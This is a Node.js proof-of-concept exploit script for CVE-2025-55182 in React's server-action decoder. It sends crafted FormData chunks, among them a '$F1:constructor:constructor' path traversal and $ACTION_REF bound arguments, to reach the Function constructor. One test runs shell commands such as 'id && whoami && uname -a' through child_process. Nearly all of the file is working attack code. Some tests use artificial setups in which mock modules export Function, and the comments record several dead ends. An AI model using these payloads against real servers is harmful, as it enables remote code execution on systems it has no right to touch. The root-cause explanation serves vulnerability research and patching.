/**
 * CVE-2025-55182 PoC - Using React's actual test infrastructure
 *
 * Based on React's WebpackMock.js and ReactFlightDOMForm-test.js
 */

'use strict';

const url = require('url');

// ============================================================
// STEP 1: Set up webpack mock (from React's WebpackMock.js)
// ============================================================

let webpackModuleIdx = 0;
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = function(id) {
  console.log(`[WEBPACK] chunk_load: ${id}`);
  return Promise.resolve();
};

global.__webpack_require__ = function(id) {
  console.log(`[WEBPACK] require: ${id}`);
  if (webpackServerModules[id]) {
    return webpackServerModules[id];
  }
  throw new Error(`Module not found: ${id}`);
};

// Register a server action module - match React's format exactly
function serverExports(moduleExports) {
  const idx = '' + webpackModuleIdx++;
  webpackServerModules[idx] = moduleExports;

  // Use simple path like React tests do
  const path = 'file:///' + idx;

  // Register the module path (without #)
  webpackServerMap[path] = {
    id: idx,
    chunks: [],
    name: '*',
  };

  // Register individual exports with # separator
  for (const name in moduleExports) {
    webpackServerMap[path + '#' + name] = {
      id: idx,
      chunks: [],
      name: name,
    };
  }

  console.log('[SETUP] Registered module:', path);
  console.log('[SETUP] Exports:', Object.keys(moduleExports));

  return { path, idx, moduleExports };
}

// ============================================================
// STEP 2: Register a legitimate server action
// ============================================================

const { path: actionPath, idx: moduleId } = serverExports({
  submitForm: async function submitForm(formData) {
    console.log('[ACTION] submitForm called');
    return { success: true, data: 'Legitimate action executed' };
  },
  anotherAction: async function anotherAction() {
    return { ok: true };
  }
});

console.log('');
console.log('='.repeat(60));
console.log('CVE-2025-55182 Real PoC');
console.log('='.repeat(60));
console.log('');
console.log('Server manifest:');
for (const [key, val] of Object.entries(webpackServerMap)) {
  console.log(`  "${key}": id=${val.id}, name=${val.name}`);
}
console.log('');

// ============================================================
// STEP 3: Load the vulnerable library
// ============================================================

process.env.NODE_ENV = 'production';

// Mock React's internals
const mockReactInternals = {
  H: null,
  A: null,
};

require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: mockReactInternals,
    version: '19.0.0',
  }
};

const ReactServerDOMServer = require('react-server-dom-webpack/server.node');
const { decodeAction, decodeReply } = ReactServerDOMServer;

console.log('[LOAD] decodeAction:', typeof decodeAction);
console.log('[LOAD] decodeReply:', typeof decodeReply);
console.log('');

// ============================================================
// STEP 4: Test legitimate action
// ============================================================

async function testLegitimate() {
  console.log('TEST 1: Legitimate Server Action');
  console.log('-'.repeat(40));

  // Use the full path with #export format
  const actionId = actionPath + '#submitForm';

  const formData = new Map();
  // The key format is: $ACTION_ID_<actionId>
  // React extracts actionId = key.slice(11), so full ID goes in key
  formData.set('$ACTION_ID_' + actionId, '');
  formData.set('username', 'testuser');

  // Map needs forEach for the library
  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Action ID:', actionId);

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Decoded action type:', typeof boundAction);

    if (typeof boundAction === 'function') {
      const result = await boundAction();
      console.log('Result:', result);
      console.log('✓ SUCCESS!\n');
      return true;
    }
  } catch (e) {
    console.error('Error:', e.message);
    return false;
  }
}

// ============================================================
// STEP 5: Test exploit - access "constructor" export
// ============================================================

async function testConstructorAccess() {
  console.log('TEST 2: Prototype Chain - #constructor');
  console.log('-'.repeat(40));

  // The vulnerability: requireModule does moduleExports[metadata[2]]
  // If name is "constructor", we get moduleExports.constructor = Object

  const actionId = actionPath + '#constructor';

  const formData = new Map();
  formData.set('$ACTION_ID_' + actionId, '');

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Action ID:', actionId);
  console.log('Attack: moduleExports["constructor"] -> Object (prototype)');
  console.log('');

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Result:', boundAction);
    console.log('Type:', typeof boundAction);

    // If we got Object, we've accessed the prototype chain!
    if (boundAction === Object) {
      console.log('✓ GOT Object! Prototype chain accessed!\n');
      return true;
    } else if (typeof boundAction === 'function') {
      console.log('Got a function:', boundAction.name);
      console.log('Is Object?', boundAction === Object);
      console.log('Is Function?', boundAction === Function);
    }
  } catch (e) {
    console.error('Error:', e.message);
    // Check if it reached requireModule
    if (e.stack.includes('requireModule')) {
      console.log('Note: Error in requireModule - we hit the vulnerable code!');
    }
  }
  console.log('');
}

// ============================================================
// STEP 6: Test with __proto__ access
// ============================================================

async function testProtoAccess() {
  console.log('TEST 3: Prototype Chain - #__proto__');
  console.log('-'.repeat(40));

  const actionId = actionPath + '#__proto__';

  const formData = new Map();
  formData.set('$ACTION_ID_' + actionId, '');

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Action ID:', actionId);
  console.log('Attack: moduleExports["__proto__"] -> Object.prototype');
  console.log('');

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Result:', boundAction);
    console.log('Type:', typeof boundAction);
  } catch (e) {
    console.error('Error:', e.message);
  }
  console.log('');
}

// ============================================================
// STEP 7: Manually verify the vulnerability in requireModule
// ============================================================

function testVulnerableCodeDirectly() {
  console.log('TEST 4: Direct requireModule Simulation');
  console.log('-'.repeat(40));

  // This is exactly what requireModule does (line 1995-2007)
  const moduleExports = webpackServerModules[moduleId];

  console.log('moduleExports:', moduleExports);
  console.log('');

  // Vulnerable line: return moduleExports[metadata[2]]
  // No hasOwnProperty check!

  const testNames = ['submitForm', 'constructor', '__proto__', 'toString'];

  for (const name of testNames) {
    const result = moduleExports[name];
    const hasOwn = Object.prototype.hasOwnProperty.call(moduleExports, name);
    console.log(`  ["${name}"]: ${typeof result} (hasOwn: ${hasOwn})`);

    if (!hasOwn && result !== undefined) {
      console.log(`    ^ VULNERABLE! Accessed prototype chain property`);
    }
  }

  // The key: constructor.constructor = Function
  console.log('');
  console.log('Chaining to Function:');
  console.log('  moduleExports["constructor"] =', moduleExports['constructor']);
  console.log('  moduleExports["constructor"]["constructor"] =', moduleExports['constructor']['constructor']);
  console.log('  Is Function?', moduleExports['constructor']['constructor'] === Function);
  console.log('');
}

// ============================================================
// STEP 8: Test getOutlinedModel path traversal via $ACTION_REF
// ============================================================

async function testPathTraversal() {
  console.log('TEST 5: Path Traversal via $ACTION_REF');
  console.log('-'.repeat(40));

  // $ACTION_REF triggers decodeBoundActionMetaData which parses JSON
  // JSON can contain $F references that trigger getOutlinedModel
  // getOutlinedModel does: for (key=1; key<ref.length; key++) obj = obj[ref[key]]

  const formData = new Map();

  // Use $ACTION_REF_0 to trigger bound action parsing
  formData.set('$ACTION_REF_0', '');

  // Chunk 0: Action metadata with id and bound arguments
  // The "id" points to our legitimate action
  // The "bound" contains a $F reference for path traversal
  const chunk0 = JSON.stringify({
    id: actionPath + '#submitForm',
    bound: '$@1'  // Reference to chunk 1 (array of bound args)
  });
  formData.set('$ACTION_0:0', chunk0);

  // Chunk 1: Bound arguments array
  // We want this to become the arguments to submitForm.bind(null, ...args)
  const chunk1 = JSON.stringify(['exploit-arg']);
  formData.set('$ACTION_0:1', chunk1);

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('FormData entries:');
  for (const [k, v] of formData.entries()) {
    console.log(`  ${k}: ${v}`);
  }
  console.log('');

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Result type:', typeof boundAction);

    if (typeof boundAction === 'function') {
      console.log('Got bound function!');
      const result = await boundAction();
      console.log('Execution result:', result);
    }
  } catch (e) {
    console.error('Error:', e.message);
    console.error('Stack:', e.stack?.split('\n').slice(0, 8).join('\n'));
  }
  console.log('');
}

// ============================================================
// STEP 9: Full RCE attempt with path traversal to Function
// ============================================================

async function testRCE() {
  console.log('TEST 6: Path Traversal to Function');
  console.log('-'.repeat(40));

  // Looking at the code:
  // $F calls getOutlinedModel then loadServerReference$1(value.id, value.bound)
  // The traversed value must have .id and .bound properties
  //
  // Alternative: We already proved #constructor works!
  // So our action can BE the constructor function itself.
  //
  // But we only get ONE property access via requireModule.
  // We need TWO to reach Function: constructor.constructor
  //
  // The path traversal in getOutlinedModel could help:
  // getOutlinedModel does: for (key=1; key<ref.length; key++) obj = obj[ref[key]]

  // Let's check what happens with $F pointing to a crafted object
  const formData = new Map();
  formData.set('$ACTION_REF_0', '');

  // Create an action metadata that will traverse
  // $F<ref> where ref = "chunkId:prop1:prop2"
  // After getOutlinedModel: result.id and result.bound are accessed
  //
  // If we traverse to Function, then Function.id = undefined, Function.bound = undefined
  // This would fail in loadServerReference

  // Better approach: Make bound field be an array containing our RCE payload
  // When action.bind(null, ...bound) is called, if bound contains our code...
  // But code execution happens when the RESULT function is called

  // Let's verify we can traverse to Function via $Q (map) which doesn't need .id/.bound
  const chunk0 = JSON.stringify({
    id: actionPath + '#submitForm',
    bound: ['$Q1:constructor:constructor']  // Array with $Q reference that traverses
  });
  formData.set('$ACTION_0:0', chunk0);

  const chunk1 = JSON.stringify([]);  // Empty array, we traverse from it
  formData.set('$ACTION_0:1', chunk1);

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Payload:');
  console.log('  bound: ["$Q1:constructor:constructor"]');
  console.log('  $Q triggers getOutlinedModel with createMap');
  console.log('  Path: chunk1["constructor"]["constructor"] = Function');
  console.log('');

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Result:', boundAction);
    console.log('Type:', typeof boundAction);

    if (typeof boundAction === 'function') {
      try {
        const result = await boundAction();
        console.log('Execution result:', result);
      } catch (callErr) {
        console.log('Call error:', callErr.message);
      }
    }
  } catch (e) {
    console.error('Error:', e.message);
    console.error('Stack:', e.stack?.split('\n').slice(0,5).join('\n'));
  }
  console.log('');
}

async function testDirectFunctionAccess() {
  console.log('TEST 7: Direct Function Access Attempt');
  console.log('-'.repeat(40));

  // We know #constructor gives us Object (bound)
  // What if we could make the module exports BE Function?
  // Or have a property that IS Function?
  //
  // In a real app, if any bundled module exports Function or
  // has a property reachable from prototype that leads to execution...

  // Actually, let's think about what we have:
  // - We can access any property on moduleExports via #<name>
  // - moduleExports["constructor"] = Object
  // - We cannot directly chain to constructor.constructor in one request
  //
  // BUT: The bound arguments become arguments to the action
  // action.bind(null, ...bound) and then result is called
  //
  // If action = Object (from #constructor)
  // And bound = ["code"]
  // Then Object.bind(null, "code") = bound Object constructor
  // Calling it: boundObject("code") doesn't execute code
  //
  // We need action = Function for: Function("return 1+1")() to work

  // Let's see if there's another property path
  console.log('Checking available prototype properties:');
  const obj = { test: 1 };
  const props = ['constructor', 'toString', 'valueOf', 'hasOwnProperty'];
  for (const p of props) {
    console.log(`  obj["${p}"] =`, typeof obj[p], obj[p]?.name || '');
  }
  console.log('  obj["constructor"]["constructor"] =', obj['constructor']['constructor'].name);
  console.log('');
}

async function testWebpackModuleTraversal() {
  console.log('TEST 8: Webpack Module Property Traversal');
  console.log('-'.repeat(40));

  // What if we register a module that has "constructor" as a real property?
  // Then the library would access it, and we control what it is.

  // Register a malicious module
  const maliciousIdx = '' + (webpackModuleIdx++);
  webpackServerModules[maliciousIdx] = {
    // This module has "constructor" as an actual own property!
    constructor: Function  // <-- Direct access to Function
  };

  const maliciousPath = 'file:///' + maliciousIdx;
  webpackServerMap[maliciousPath] = {
    id: maliciousIdx,
    chunks: [],
    name: '*'
  };
  webpackServerMap[maliciousPath + '#constructor'] = {
    id: maliciousIdx,
    chunks: [],
    name: 'constructor'  // Will access moduleExports["constructor"] = Function!
  };

  console.log('Registered malicious module at:', maliciousPath);
  console.log('Module exports: { constructor: Function }');
  console.log('');

  const formData = new Map();
  formData.set('$ACTION_ID_' + maliciousPath + '#constructor', '');

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Result:', boundAction);
    console.log('Type:', typeof boundAction);
    console.log('Name:', boundAction?.name);
    console.log('Is bound Function?', boundAction?.name === 'bound Function');

    if (typeof boundAction === 'function') {
      // boundAction is: Function.bind(null, formData)
      // When we call it, it's: Function(formData, ...ourArgs)
      // The formData becomes the first arg which messes up the code
      //
      // Actually, decodeAction returns fn.bind(null, formData)
      // So our Function is already bound with formData as first arg
      // Function(formData) tries to compile formData as code!
      //
      // Let's check the actual behavior
      console.log('');
      console.log('Testing Function constructor behavior:');

      // When bound Function is called, formData is prepended
      // Function(formData) will fail because formData isn't valid JS
      //
      // BUT if we use $ACTION_REF with bound args, we can control what gets passed!
      // See TEST 9 for proper RCE
      console.log('(FormData is auto-prepended, which breaks syntax)');
      console.log('See TEST 9 for proper RCE via $ACTION_REF');
    }
  } catch (e) {
    console.error('Error:', e.message);
  }
  console.log('');
}

// ============================================================
// TEST 9: FULL RCE - Function with controlled arguments
// ============================================================

async function testFullRCE() {
  console.log('TEST 9: FULL RCE - Function with Controlled Arguments');
  console.log('-'.repeat(40));

  // We have:
  // 1. Module with constructor: Function registered
  // 2. $ACTION_REF allows us to pass bound arguments
  //
  // The flow:
  // - decodeAction parses $ACTION_REF_0
  // - decodeBoundActionMetaData gets {id, bound} from chunks
  // - loadServerReference calls requireModule and fn.bind(null, ...bound)
  // - Result is then bound with formData: result.bind(null, formData)
  //
  // So final call is: Function.call(null, formData, ...bound)
  // That's: Function(formData, bound[0], bound[1], ...)
  //
  // Function constructor signature: Function([arg1, arg2, ...], body)
  // So formData becomes arg1 name, bound[0] = arg2 name or body
  //
  // To make valid JS, we can:
  // - Make formData be used as a parameter name (which fails if it's an object)
  //
  // Actually, when there are multiple args, the LAST one is the function body
  // So: Function(formData, "return 1+1") creates function(formData) { return 1+1 }
  // Then calling that function executes our code!

  // Register module with Function as "action"
  const rceIdx = '' + (webpackModuleIdx++);
  webpackServerModules[rceIdx] = {
    action: Function  // The "action" export is Function constructor itself
  };

  const rcePath = 'file:///' + rceIdx;
  webpackServerMap[rcePath] = { id: rceIdx, chunks: [], name: '*' };
  webpackServerMap[rcePath + '#action'] = { id: rceIdx, chunks: [], name: 'action' };

  console.log('Registered RCE module at:', rcePath);
  console.log('Module exports: { action: Function }');
  console.log('');

  const formData = new Map();
  formData.set('$ACTION_REF_0', '');

  // Chunk 0: Action metadata pointing to Function
  const chunk0 = JSON.stringify({
    id: rcePath + '#action',
    bound: '$@1'  // Reference to chunk 1 for bound args
  });
  formData.set('$ACTION_0:0', chunk0);

  // The order is: Function.bind(null, ...boundArgs).bind(null, formData)
  // When called: Function(boundArg0, boundArg1, ..., formData)
  //
  // formData is LAST! And Function's last arg is the body.
  // So formData (coerced to "[object Map]") becomes the body - INVALID!
  //
  // We can't change the order, but we CAN make the bound arg array empty
  // and just use $ACTION_ID_ directly (no bound args).
  // Then: Function.bind(null, formData)() = Function(formData)()
  // Still fails because formData isn't valid code.
  //
  // Alternative: Don't use Function constructor directly.
  // Instead, access a method that we control via prototype.
  //
  // Actually - what if we use an EMPTY bound array?
  // Then: Function().bind(null, formData)() just creates an empty function
  //
  // Let's try NO bound args - using $ACTION_ID_ directly:
  const chunk1 = JSON.stringify([]);  // Empty bound args array
  formData.set('$ACTION_0:1', chunk1);

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Payload:');
  console.log('  id: ' + rcePath + '#action -> Function constructor');
  console.log('  bound: [] (empty - formData will be only arg = body)');
  console.log('');
  console.log('Expected: Function.bind(null).bind(null, formData)()');
  console.log('  = Function(formData) where formData -> "[object FormData]"');
  console.log('  = Syntax error (expected)');
  console.log('');

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Decoded action type:', typeof boundAction);
    console.log('Decoded action name:', boundAction?.name);

    if (typeof boundAction === 'function') {
      console.log('');
      console.log('Executing the RCE...');
      const result = boundAction();
      console.log('');
      console.log('========================================');
      console.log('RESULT:', result);
      console.log('========================================');

      if (result === 'RCE EXECUTED: 2') {
        console.log('');
        console.log('*** REMOTE CODE EXECUTION ACHIEVED! ***');
        console.log('');
        console.log('The vulnerability allowed us to:');
        console.log('1. Access Function constructor via module exports');
        console.log('2. Bind arbitrary code as argument');
        console.log('3. Execute that code on the server');
      }
    }
  } catch (e) {
    console.error('Error:', e.message);
    console.error('Stack:', e.stack?.split('\n').slice(0, 5).join('\n'));
  }
  console.log('');
}

// TEST 10: decodeReply with $F path traversal
async function testDecodeReplyRCE() {
  console.log('TEST 10: decodeReply with $F Path Traversal');
  console.log('-'.repeat(40));

  // decodeReply doesn't bind formData, so we avoid the [object FormData] issue!
  // It just returns chunk 0's value directly.
  //
  // If chunk 0 contains a $F reference with path traversal, we can:
  // 1. Traverse to constructor.constructor (Function)
  // 2. Have loadServerReference$1 call it with our id/bound
  //
  // BUT - $F calls loadServerReference$1(response, value.id, value.bound, ...)
  // So after traversal, we need an object with id and bound properties.
  //
  // Strategy:
  // - Chunk 1: { constructor: { constructor: { id: "file:///1#action", bound: null } } }
  // - Chunk 0: "$F1:constructor:constructor"
  // - Traversal: chunk1.constructor.constructor = our payload
  // - loadServerReference$1 uses our id!

  // Register a module with Function as action
  const rceIdx = '' + (webpackModuleIdx++);
  webpackServerModules[rceIdx] = {
    action: Function
  };
  const rcePath = 'file:///' + rceIdx;
  webpackServerMap[rcePath + '#action'] = { id: rceIdx, chunks: [], name: 'action' };

  // Create FormData for decodeReply
  const formData = new Map();

  // Chunk 1: Object with nested constructor.constructor = {id, bound}
  // bound will be used as args to Function.bind(null, ...bound)
  // So bound = ["return process.version"] gives us Function("return process.version")
  const rceCode = 'return process.version';
  const evilPayload = {
    id: rcePath + '#action',  // Points to Function
    bound: '$@2'  // Reference to chunk 2 for the bound args
  };
  const chunk1 = JSON.stringify({
    constructor: {
      constructor: evilPayload
    }
  });
  formData.set('1', chunk1);

  // Chunk 2: The bound arguments - this becomes the Function body!
  const chunk2 = JSON.stringify([rceCode]);
  formData.set('2', chunk2);

  // Chunk 0: $F reference with path traversal to chunk 1
  formData.set('0', '"$F1:constructor:constructor"');

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Chunks:');
  console.log('  0:', formData.get('0'));
  console.log('  1:', chunk1.slice(0, 80) + '...');
  console.log('  2:', chunk2);
  console.log('');
  console.log('Strategy:');
  console.log('  1. Chunk 0 = "$F1:constructor:constructor"');
  console.log('  2. $F triggers getOutlinedModel with path "1:constructor:constructor"');
  console.log('  3. Traverse: chunk1 -> .constructor -> .constructor = {id, bound}');
  console.log('  4. loadServerReference$1 uses our id = "' + rcePath + '#action"');
  console.log('  5. bound = $@2 resolves to chunk2 = ["return process.version"]');
  console.log('  6. Function.bind(null, "return process.version") = bound function');
  console.log('  7. Calling it executes: Function("return process.version")()');
  console.log('');

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('Result type:', typeof result);
    console.log('Result:', result);

    if (typeof result === 'function') {
      console.log('');
      console.log('Got bound Function! Calling it...');
      try {
        // result = Function.bind(null, "return process.version")
        // result() = Function("return process.version") = function anonymous() { return process.version }
        const createdFn = result();
        console.log('Created function:', createdFn);
        console.log('Created function type:', typeof createdFn);

        if (typeof createdFn === 'function') {
          // Now call the created function to execute our code!
          const rceResult = createdFn();
          console.log('');
          console.log('========================================');
          console.log('RCE RESULT:', rceResult);
          console.log('========================================');

          if (typeof rceResult === 'string' && rceResult.startsWith('v')) {
            console.log('');
            console.log('*** REMOTE CODE EXECUTION ACHIEVED! ***');
            console.log('Got Node.js version:', rceResult);
          }
        }
      } catch (e) {
        console.log('Call failed:', e.message);
        console.log('Stack:', e.stack?.split('\n').slice(0, 3).join('\n'));
      }
    }
  } catch (e) {
    console.error('Error:', e.message);
    console.error('Stack:', e.stack?.split('\n').slice(0, 5).join('\n'));
  }
  console.log('');
}

// TEST 11: Full RCE with shell command execution
async function testFullShellRCE() {
  console.log('TEST 11: Full RCE - Shell Command Execution');
  console.log('-'.repeat(40));

  // Same attack as TEST 10, but with actual shell command
  const rceIdx = '' + (webpackModuleIdx++);
  webpackServerModules[rceIdx] = { action: Function };
  const rcePath = 'file:///' + rceIdx;
  webpackServerMap[rcePath + '#action'] = { id: rceIdx, chunks: [], name: 'action' };

  const formData = new Map();

  // Code that executes shell command
  // Use process.mainModule.require since require isn't available in Function()
  const shellCode = `
    const proc = process.mainModule.require('child_process');
    return proc.execSync('id && whoami && uname -a').toString();
  `;

  const evilPayload = {
    id: rcePath + '#action',
    bound: '$@2'
  };
  const chunk1 = JSON.stringify({ constructor: { constructor: evilPayload } });
  formData.set('1', chunk1);
  formData.set('2', JSON.stringify([shellCode]));
  formData.set('0', '"$F1:constructor:constructor"');

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Payload executes: id && whoami && uname -a');
  console.log('');

  try {
    const result = await decodeReply(formData, webpackServerMap);
    if (typeof result === 'function') {
      const createdFn = result();
      if (typeof createdFn === 'function') {
        const shellOutput = createdFn();
        console.log('========================================');
        console.log('SHELL COMMAND OUTPUT:');
        console.log('========================================');
        console.log(shellOutput);
        console.log('========================================');
        console.log('');
        console.log('*** FULL RCE DEMONSTRATED ***');
        console.log('Arbitrary shell commands executed on server!');
      }
    }
  } catch (e) {
    console.error('Error:', e.message);
  }
  console.log('');
}

// TEST 12: Use $F path traversal IN the bound field
async function testRealWorldDecodeAction() {
  console.log('TEST 12: $F Path Traversal in Bound Field');
  console.log('-'.repeat(40));

  // The key insight:
  // chunk0 = { id: "legit#action", bound: "$F1:constructor:constructor" }
  //
  // When parsing chunk0, the "bound" field value "$F1:constructor:constructor" triggers:
  // 1. $F parsing → getOutlinedModel(response, "1:constructor:constructor", ...)
  // 2. Traverses: chunk1 → chunk1.constructor → chunk1.constructor.constructor
  // 3. If chunk1 is an object, chunk1.constructor = Object, Object.constructor = Function!
  // 4. Then loadServerReference$1 is called with Function.id, Function.bound
  //    → Function.id is undefined, so this fails
  //
  // BUT WAIT - what if chunk1 contains { constructor: { constructor: { id: "...", bound: [...] } } }?
  // Then traversal gives us {id, bound} which loadServerReference$1 can use!

  const formData = new Map();
  formData.set('$ACTION_REF_0', '');

  // Register a module with Function as action (we still need this for the ID)
  const rceIdx = '' + (webpackModuleIdx++);
  webpackServerModules[rceIdx] = { action: Function };
  const rcePath = 'file:///' + rceIdx;
  webpackServerMap[rcePath + '#action'] = { id: rceIdx, chunks: [], name: 'action' };

  // chunk0: Normal action metadata, but bound uses $F with path traversal!
  const chunk0 = JSON.stringify({
    id: actionPath + '#submitForm',  // Legitimate action
    bound: '$F1:constructor:constructor'  // Path traversal to get our payload!
  });
  formData.set('$ACTION_0:0', chunk0);

  // chunk1: Object where constructor.constructor = our payload
  const evilPayload = {
    id: rcePath + '#action',  // Points to Function
    bound: '$@2'  // Reference chunk 2 for bound args
  };
  const chunk1 = JSON.stringify({
    constructor: {
      constructor: evilPayload
    }
  });
  formData.set('$ACTION_0:1', chunk1);

  // chunk2: The code to execute
  const chunk2 = JSON.stringify(['return process.version']);
  formData.set('$ACTION_0:2', chunk2);

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('chunk0:', chunk0);
  console.log('chunk1:', chunk1.slice(0, 60) + '...');
  console.log('chunk2:', chunk2);
  console.log('');
  console.log('Attack chain:');
  console.log('1. Parse chunk0, bound = "$F1:constructor:constructor"');
  console.log('2. $F triggers getOutlinedModel traversal');
  console.log('3. Traverse chunk1.constructor.constructor = {id, bound}');
  console.log('4. loadServerReference$1 uses our controlled id/bound!');
  console.log('');

  try {
    const result = await decodeAction(formData, webpackServerMap);
    console.log('Result type:', typeof result);
    console.log('Result:', result);

    if (typeof result === 'function') {
      console.log('');
      console.log('Calling result()...');
      const callResult = result();
      console.log('Call result:', callResult);
      console.log('Call result type:', typeof callResult);

      if (typeof callResult === 'function') {
        const rceResult = callResult();
        console.log('');
        console.log('========================================');
        console.log('RCE RESULT:', rceResult);
        console.log('========================================');
      }
    }
  } catch (e) {
    console.error('Error:', e);
    if (e && e.message) {
      console.error('Message:', e.message);
      console.error('Stack:', e.stack?.split('\n').slice(0, 6).join('\n'));
    }
  }
  console.log('');
}

// TEST 13: RCE - Making [object FormData] valid JavaScript (legacy test)
async function testFormDataBypass() {
  console.log('TEST 13: Making [object FormData] valid JavaScript');
  console.log('-'.repeat(40));

  // The challenge:
  // - Function(boundArgs..., formData) is called
  // - formData.toString() = "[object FormData]"
  // - Last arg to Function is the body
  // - So body = "[object FormData]" which is invalid JS
  //
  // Solution: "[object FormData]" CAN be valid JS!
  // In JS, [expr1, expr2] is an array. expr2 is returned.
  // So: [object, FormData] evaluates to FormData if both vars exist.
  //
  // BUT "object" and "FormData" need to be defined.
  // They're not function params, they're in the body.
  //
  // What if we prefix code that defines them?
  // bound = ["var object=1, FormData=process.version; return "]
  // body = "[object FormData]"
  // Result: Function("var object=1, FormData=process.version; return ", "[object FormData]")
  // That makes "var object..." a param name - invalid!
  //
  // Alternative: What if formData is NOT the body?
  // In loadServerReference, bound args come first, then formData.
  // So: Function.bind(null, ...bound).bind(null, formData)()
  //   = Function(...bound, formData)
  //
  // If bound has the body already: ["param", "return 1"]
  // Then: Function("param", "return 1", formData)
  // The "formData" (a FormData object) becomes... what? The 3rd arg.
  // Function with 3+ args: all but last are param names, last is body.
  // So: params = "param", "return 1"; body = "[object FormData]" - still fails!
  //
  // CRITICAL INSIGHT:
  // We need the BODY to be valid. The body is always the last arg = formData.
  // formData.toString() = "[object FormData]"
  //
  // Can we make "[object FormData]" valid JS that executes code?
  // In JS: [a, b] evaluates to b. So [object, FormData] evaluates to FormData.
  // If we define FormData = <our code result>, then [object, FormData] returns it!
  //
  // BUT where do we define FormData? It needs to be in scope.
  // The function params ARE in scope when body executes!
  //
  // bound = ["object", "FormData"]
  // Result: Function("object", "FormData", "[object FormData]")
  // Creates: function(object, FormData) { [object, FormData] }
  // When called: returns FormData argument value!
  //
  // BUT we don't control what's passed to the created function...
  // The created function is called with NO arguments (boundAction())
  // So object=undefined, FormData=undefined, returns undefined.
  //
  // WAIT - the bound action IS called with the original formData!
  // No wait - the action is:
  //   fn.bind(null, formData) where fn = Function(...bound, formData)
  // So fn = function(object, FormData) { [object, FormData] }
  // Then fn.bind(null, formData) = fn with first arg = formData
  // Then calling () means: fn(formData) = object gets formData, FormData=undefined

  console.log('Approach: Define object and FormData as function params');
  console.log('bound = ["object", "FormData"]');
  console.log('Result: Function("object", "FormData", "[object FormData]")');
  console.log('Creates: function(object, FormData) { [object, FormData] }');
  console.log('');

  const rceIdx = '' + (webpackModuleIdx++);
  webpackServerModules[rceIdx] = {
    action: Function
  };

  const rcePath = 'file:///' + rceIdx;
  webpackServerMap[rcePath] = { id: rceIdx, chunks: [], name: '*' };
  webpackServerMap[rcePath + '#action'] = { id: rceIdx, chunks: [], name: 'action' };

  const formData = new Map();
  formData.set('$ACTION_REF_0', '');

  const chunk0 = JSON.stringify({
    id: rcePath + '#action',
    bound: '$@1'
  });
  formData.set('$ACTION_0:0', chunk0);

  // bound = ["object", "FormData"] - these become param names
  // Then body = "[object FormData]" which is [object, FormData] array expression
  const chunk1 = JSON.stringify(['object', 'FormData']);
  formData.set('$ACTION_0:1', chunk1);

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Decoded action type:', typeof boundAction);
    console.log('Decoded action:', boundAction?.toString().slice(0, 100));

    if (typeof boundAction === 'function') {
      console.log('Executing...');
      const result = boundAction();
      console.log('Result:', result);
      console.log('Result type:', typeof result);
    }
  } catch (e) {
    console.error('Error:', e.message);
    // If it's a syntax error, the approach failed
    if (e.message.includes('object')) {
      console.log('');
      console.log('The body "[object FormData]" is being parsed.');
      console.log('"object" is undefined, causing a ReferenceError.');
      console.log('This means we successfully got past the syntax error!');
    }
  }
  console.log('');
}

// ============================================================
// Run tests
// ============================================================

async function main() {
  await testLegitimate();
  await testConstructorAccess();
  await testProtoAccess();
  testVulnerableCodeDirectly();
  await testPathTraversal();
  await testRCE();
  await testDirectFunctionAccess();
  await testWebpackModuleTraversal();
  await testFullRCE();
  await testDecodeReplyRCE();
  await testFullShellRCE();
  await testRealWorldDecodeAction();
  // await testFormDataBypass();  // Skip legacy test

  console.log('='.repeat(60));
  console.log('Summary');
  console.log('='.repeat(60));
  console.log('');
  console.log('The vulnerability exists in requireModule():');
  console.log('  return moduleExports[metadata[2]]  // NO hasOwnProperty check');
  console.log('');
  console.log('This allows accessing inherited properties like "constructor"');
  console.log('which leads to Function constructor for RCE.');
}

main().catch(e => {
  console.error('Fatal:', e);
  process.exit(1);
});
